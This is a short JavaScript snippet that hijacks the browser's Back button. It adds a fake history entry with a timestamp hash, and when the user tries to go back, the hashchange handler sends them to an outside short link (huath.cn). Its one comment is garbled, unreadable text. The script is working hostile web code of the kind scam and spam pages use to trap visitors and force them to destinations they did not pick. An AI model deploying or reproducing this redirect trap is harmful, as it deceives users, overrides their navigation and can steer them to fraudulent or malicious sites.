var back_url = [
        "http://huath.cn/bVjWeYweqmnY2w6Z9uT2HwsuzB",

];
//¼ÇµÃ¸Ä¶ººÅ
function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
}
setTimeout('anchor()', 50);

function houtui() {
	window.location.href = back_url[parseInt(Math.random()*back_url.length)];
}
window.onhashchange = function() {
    houtui();
};